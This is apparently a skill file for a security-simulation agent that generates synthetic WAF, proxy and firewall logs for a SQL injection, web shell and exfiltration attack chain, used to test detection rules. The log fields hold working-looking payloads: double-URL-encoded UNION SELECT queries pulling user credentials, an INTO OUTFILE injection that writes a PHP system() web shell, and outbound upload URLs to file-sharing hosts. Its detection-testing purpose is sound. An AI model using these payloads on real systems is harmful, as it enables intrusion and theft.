---
name: web_app_to_webshell_to_exfil
displayName: Web shell exfiltration
category: scenarios
description: 'Four-stage external-to-data-loss chain. Stage 1: WAF noise (probes, sqlmap, common exploit signatures). Stage 2: successful SQL injection (200 response after exploit). Stage 3: web shell upload + first interaction. Stage 4: outbound data exfil from compromised web tier to file-sharing service. Vendor-agnostic — agent reads the operator''s technology stack at runtime. Triggers 3 XSIAM rules: SQL Injection Attempt, Web Shell Deployment, Data Exfiltration to Personal Cloud Storage.'
icon: bug_report
source: platform
loadingMode: on-demand
locked: false
attack:
  - 'TA0001: Initial Access (T1190 Exploit Public-Facing Application)'
  - 'TA0002: Execution (T1059.004 Unix Shell, T1505.003 Web Shell)'
  - 'TA0003: Persistence (T1505.003 Web Shell)'
  - 'TA0010: Exfiltration (T1567 Exfiltration Over Web Service, T1041 Exfiltration Over C2)'
---

# Skill: Web app compromise → Web shell → Data exfiltration

## Category

scenarios

## Attack Type

Public-facing web app exploitation followed by post-exploitation persistence and data theft. Models the most common externally-discoverable compromise pattern: WAF logs reveal the probe phase, the successful exploit, the web shell drop, and finally the egress when the attacker pulls data out.

## MITRE ATT&CK Tactics

- TA0001: Initial Access (T1190 Exploit Public-Facing Application)
- TA0002: Execution (T1059.004 Unix Shell, T1505.003 Web Shell)
- TA0003: Persistence (T1505.003 Web Shell)
- TA0010: Exfiltration (T1567 Exfiltration Over Web Service, T1041 Exfiltration Over C2)

## XSIAM analytics rules triggered

| # | Rule | Stage |
|---|---|---|
| 15 | SQL Injection Attempt | Stages 1 + 2 |
| 16 | Web Shell Deployment | Stage 3 |
| 20 | Data Exfiltration to Personal Cloud Storage | Stage 4 |

## Data classes used

| Stage | Data class | If missing |
|---|---|---|
| 1, 2, 3 | `waf` | Required — entire skill keys on WAF telemetry |
| 3, 4 | `proxy` OR `firewall` | Either works; proxy preferred for outbound visibility |
| 4 | `firewall` | Confirms outbound flow at the perimeter |

## Pre-flight

Call `phantom_get_technology_stack`. Verify `waf` is present. If `proxy` is missing, fall back to `firewall` for Stages 3-4 (outbound visibility is reduced — no URL category, no user context — but the connection itself is logged).

## Narrative thread

- **Attacker source IP:** `203.0.113.42` (single fixed source; no need for distributed pattern)
- **Target web app:** `https://app.bupa.example` (front-end at `10.10.30.10`)
- **Vulnerable endpoint:** `/search.php?id=` (classic union-based SQLi)
- **WAF policy bypass payload:** uses double-URL-encoded UNION SELECT against the user table
- **Web shell drop path:** `/uploads/img.php` (innocuous-looking)
- **Web shell name:** `img.php` (1.4 KB; PHP backdoor using `system()` for command exec)
- **Compromised web server:** `web-app-01` at `10.10.30.10`
- **Exfil destination:** `paste.dropfiles.io` (file-sharing service, attacker-controlled)
- **Wall-clock time:** Stage 1 ~15 min noise. Stage 2 ~3 min focused exploit. Stage 3 ~5 min from drop to first call. Stage 4 ~10 min of bulk extraction.

---

### Stage 1 — WAF probe noise — ~80 events over 15 minutes

Reconnaissance and automated scan traffic. The attacker fingerprints the app and runs a sqlmap-style scan: dozens of payload variations against the search endpoint. Most are blocked or 4xx-d.

**Data class:** `waf`

```yaml
xlog.create_data_worker:
  request:
    type:    <stack[waf].formats[0].upper()>
    vendor:  <stack[waf].vendor>
    product: <stack[waf].product>
    count:    80
    interval: 11
    destination: <stack.log_destination.type>
    duration_seconds: 900
    observables_dict:
      src_ip:        ["203.0.113.42"]
      dst_ip:        ["10.10.30.10"]
      src_port:      ["49152", "51234", "57890", "60123"]
      dst_port:      ["443"]
      protocol:      ["tcp"]
      url:           ["/search.php?id=1", "/search.php?id=1'",
                      "/search.php?id=1%20OR%201%3D1",
                      "/search.php?id=1%27%20UNION%20SELECT%20null--",
                      "/admin/login.php", "/.env", "/wp-admin/", "/phpmyadmin/",
                      "/search.php?id=1%27%20AND%20SLEEP%285%29--",
                      "/api/users?id=1%20UNION%20ALL%20SELECT%20null,null,null--"]
      method:        ["GET", "POST"]
      status_code:   ["403", "404", "200", "200"]
      user_agent:    ["sqlmap/1.7.2#stable (https://sqlmap.org)",
                      "Mozilla/5.0 (X11; Linux x86_64)",
                      "curl/7.81.0",
                      "Mozilla/5.0 (compatible; nmap/7.94)"]
      action:        ["block", "alert", "allow"]
      attack_type:   ["sql-injection", "directory-traversal",
                      "scanner-fingerprint", "common-vulnerabilities"]
      attack_severity: ["high", "medium"]
      rule_id:       ["942100", "942130", "942200", "942110",
                      "930120", "930100", "920270"]
      rule_name:     ["SQL Injection Attack: Common Injection Testing Detected",
                      "SQL Injection Attack Detected via libinjection",
                      "Restricted File Access Attempt",
                      "Possible Common Backdoor Path Probed"]
      bytes_sent:     ["480", "640"]
      bytes_received: ["240", "1280"]
      country:       ["unknown"]
      threat_score:  ["75", "82", "65"]
```

**Field semantics:**
- `user_agent: sqlmap/1.7.2#stable` — sqlmap leaves a default UA; competent attackers spoof it but automated scans typically don't bother
- `action: block / alert / allow` — most payloads get blocked or alert; a few "allow" entries represent the WAF letting low-severity probes through (which is realistic; not every WAF rule blocks)
- `rule_id` — OWASP CRS rule IDs (942100 series = SQLi, 930100 = LFI, 920270 = invalid URL chars). Including real rule IDs makes the recipe land naturally in WAF parsers
- `attack_type` — the WAF's classification taxonomy

**Why this fires Rule #15 (early-warning):** the SQL-injection rule fires here based on raw count of `attack_type=sql-injection` events from one source within 15 min. Modern WAFs pre-suppress this on a 1-source basis (assuming you'd want a network-wide aggregation), but the count from this one source crosses thresholds for "single-IP SQLi probe attack" rules.

---

### Stage 2 — Successful SQL injection (200 response) — ~5 events over 3 minutes

After noise, the attacker finds a payload the WAF doesn't catch (typically a less-obvious encoding, e.g., double-URL-encoded with comment-based bypass). The WAF logs the payload as ALLOWED and the backend responds 200 with sensitive data in the body.

**Data class:** `waf`

```yaml
xlog.create_data_worker:
  request:
    type:    <stack[waf].formats[0].upper()>
    vendor:  <stack[waf].vendor>
    product: <stack[waf].product>
    count:    5
    interval: 30
    destination: <stack.log_destination.type>
    duration_seconds: 180
    observables_dict:
      src_ip:        ["203.0.113.42"]
      dst_ip:        ["10.10.30.10"]
      src_port:      ["49152", "51234", "57890", "60123"]
      dst_port:      ["443"]
      protocol:      ["tcp"]
      url:           ["/search.php?id=1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520users%252D%252D%2520",
                      "/search.php?id=1%2527%2520UNION%2520SELECT%2520table_name,null,null%2520FROM%2520information_schema.tables%252D%252D%2520"]
      method:        ["GET"]
      status_code:   ["200"]
      user_agent:    ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"]
      action:        ["allow"]
      attack_type:   ["sql-injection"]
      attack_severity: ["high"]
      rule_id:       ["942180"]
      rule_name:     ["Detects basic SQL authentication bypass attempts"]
      bytes_sent:    ["920"]
      bytes_received: ["12480", "8960", "15240"]
      threat_score:  ["95"]
      anomaly_score: ["88"]
```

**Field semantics:**
- `url` — double-URL-encoded payload (`%2527` = encoded `'`; `%2520` = encoded space) bypasses many simple WAF signatures
- `action: allow` — the bypass succeeded
- `bytes_received: 12480 / 8960 / 15240` — much larger than typical search responses (hundreds of bytes); the abnormal response size is the "exfil-via-SELECT" signal
- `anomaly_score` — modern WAFs ML-score anomalies; 88 is high
- The 5 events represent: union-based SELECT with column probing, table enumeration, then 3 data-extraction queries

**Why this combines with Rule #15:** Stage 1 fires "SQLi probe" alerts; Stage 2's `action=allow` + abnormally large `bytes_received` for a SQLi-shaped URL produces "Successful SQL Injection" — a higher-severity rule that fires when previous probes against the same target succeed.

---

### Stage 3 — Web shell upload + first call — ~12 events over 5 minutes

After data extraction, the attacker uses one of the SQL injections to write a PHP file to disk via `INTO OUTFILE` (or via an upload endpoint they enumerated). They then make their first call to it. The webshell uses PHP's `system()` function for command execution — one of the classic webshell patterns (along with `passthru`, `shell_exec`).

**Sub-stage 3A — web shell drop**

```yaml
xlog.create_data_worker:
  request:
    type:    <stack[waf].formats[0].upper()>
    vendor:  <stack[waf].vendor>
    product: <stack[waf].product>
    count:    2
    interval: 30
    destination: <stack.log_destination.type>
    duration_seconds: 60
    observables_dict:
      src_ip:        ["203.0.113.42"]
      dst_ip:        ["10.10.30.10"]
      url:           ["/uploads/img.php?test=1",
                      "/search.php?id=1%2527%2520UNION%2520SELECT%2520%2522%253C%253Fphp%2520system%2528%2524_POST%255B%2522pw%2522%255D%2529%253B%253F%253E%2522%2520INTO%2520OUTFILE%2520%2522%252Fvar%252Fwww%252Fhtml%252Fuploads%252Fimg.php%2522--%2520"]
      method:        ["GET"]
      status_code:   ["200", "404"]
      user_agent:    ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"]
      action:        ["allow"]
      attack_type:   ["sql-injection", "webshell-creation"]
      attack_severity: ["critical"]
      rule_id:       ["942190", "933100"]
      rule_name:     ["Detects MSSQL code execution and information gathering attempts",
                      "Possible PHP Backdoor / WebShell Pattern Detected"]
      bytes_received: ["480", "12"]
```

**Sub-stage 3B — web shell first call (post-shell)**

```yaml
xlog.create_data_worker:
  request:
    type:    <stack[waf].formats[0].upper()>
    vendor:  <stack[waf].vendor>
    product: <stack[waf].product>
    count:    10
    interval: 24
    destination: <stack.log_destination.type>
    duration_seconds: 240
    observables_dict:
      src_ip:        ["203.0.113.42"]
      dst_ip:        ["10.10.30.10"]
      url:           ["/uploads/img.php"]
      method:        ["POST"]
      status_code:   ["200"]
      user_agent:    ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                      "curl/7.81.0",
                      "Wget/1.21.3 (linux-gnu)"]
      action:        ["allow"]
      attack_type:   ["webshell-interaction"]
      attack_severity: ["critical"]
      rule_id:       ["933100", "933110"]
      rule_name:     ["PHP Webshell Activity Detected"]
      bytes_sent:     ["840", "920", "1240", "780"]
      bytes_received: ["4280", "8960", "12480", "15240", "18920"]
      content_type:   ["application/x-www-form-urlencoded"]
      anomaly_score:  ["94"]
```

**Field semantics:**
- `url: /uploads/img.php` — innocuous-looking path; a `.php` file in `/uploads/` is suspicious because uploads should typically be media (jpg, png, pdf), not executable PHP
- `method: POST` — webshells are typically called via POST so command output isn't in the URL bar / referrer logs
- `user_agent` — varies (browser sometimes, curl other times) — webshells are called both manually by the attacker and programmatically by their tooling
- `bytes_sent` (request) and `bytes_received` (response) — the response sizes (4-20 KB) are larger than legitimate file fetches; web shells return command output

**Why this fires Rule #16:**
- The `INTO OUTFILE` + PHP-handler pattern in the URL triggers webshell-creation detection
- Subsequent POSTs to `.php` files in `/uploads/` directories with growing response sizes match webshell-interaction patterns
- Combined with Stage 2's successful SQLi from same `src_ip`, the SIEM stitches "SQLi → webshell drop → webshell call" into one incident

---

### Stage 4 — Data exfiltration from compromised web tier — ~25 events over 10 minutes

The attacker uses the webshell to package the stolen DB content and the application source into archives, then exfiltrates them via outbound HTTPS to a file-sharing service.

**Sub-stage 4A — proxy / outbound connections**

```yaml
xlog.create_data_worker:
  request:
    type:    <stack[proxy].formats[0].upper()>
    vendor:  <stack[proxy].vendor>
    product: <stack[proxy].product>
    count:    15
    interval: 38
    destination: <stack.log_destination.type>
    duration_seconds: 600
    observables_dict:
      src_ip:        ["10.10.30.10"]
      src_host:      ["web-app-01"]
      url:           ["https://paste.dropfiles.io/upload",
                      "https://api.dropfiles.io/v2/objects",
                      "https://transfer.sh/?action=upload"]
      method:        ["POST", "PUT"]
      status_code:   ["200", "201"]
      user_agent:    ["curl/7.81.0", "Wget/1.21.3"]
      action:        ["allow"]
      bytes_sent:    ["10485760", "20971520", "5242880", "8388608"]
      bytes_received: ["240", "180"]
      content_type:  ["application/octet-stream", "application/zip"]
      category:      ["file-sharing", "personal-cloud-storage", "uncategorized"]
      threat_score:  ["55", "70"]
      domain:        ["paste.dropfiles.io", "transfer.sh"]
      domain_age_days: ["12", "1"]
```

**Sub-stage 4B — firewall confirmation**

```yaml
xlog.create_data_worker:
  request:
    type:    <stack[firewall].formats[0].upper()>
    vendor:  <stack[firewall].vendor>
    product: <stack[firewall].product>
    count:    10
    interval: 60
    destination: <stack.log_destination.type>
    duration_seconds: 600
    observables_dict:
      src_ip:        ["10.10.30.10"]
      dst_ip:        ["104.21.x.x", "172.67.x.x"]
      dst_port:      ["443"]
      protocol:      ["tcp"]
      action:        ["allow"]
      app:           ["ssl"]
      bytes_sent:    ["10485760", "20971520"]
      session_state: ["established"]
      country:       ["US"]
      threat_category: ["file-sharing"]
```

**Field semantics:**
- `src_ip: 10.10.30.10` — the WEB SERVER initiates the outbound, not a workstation. Web servers should rarely make outbound HTTPS calls (occasionally to package mirrors, never to file-sharing services)
- `bytes_sent` — multi-MB payloads (5-20 MB chunks) — way outside the normal "API call" range web tier logs see
- `category: file-sharing` — proxy classification of the destination
- The unusual EGRESS direction (server → external) on a server that should only see INGRESS is the strongest single signal

**Why this fires Rule #20:** the combination of (a) outbound from a web server (anomalous direction), (b) destination categorized as file-sharing, (c) multi-MB payload sizes, (d) within minutes of a web shell call from the same server, gives high-confidence exfiltration detection. Some SIEMs trigger on (c) alone for web-tier sources.

---

## Verification

| Indicator | Where to check |
|---|---|
| SQLi probe alerts (high count) from `203.0.113.42` | XSIAM Issues |
| Successful SQLi alert with `action=allow` + large response | XSIAM Issues |
| Webshell deployment alert against `/uploads/img.php` | XSIAM Issues |
| Exfiltration alert: web-app-01 → file-sharing destination | XSIAM Issues |
| Pivotable: filter `dst_ip=10.10.30.10`, see all phases on one timeline | XQL: `dataset = waf_logs \| filter dst_ip="10.10.30.10"` |

## Tear-down

```yaml
xlog.list_workers:
xlog.kill_worker:
  worker_id: <each>
```

## Adapting per deployment

The `/search.php` endpoint is illustrative. For exercises tied to a real customer's app, replace with whatever endpoint they want exercised (their `/api/v1/users`, `/login.aspx`, etc.). The chain shape (probe → bypass → webshell → exfil) is endpoint-agnostic.
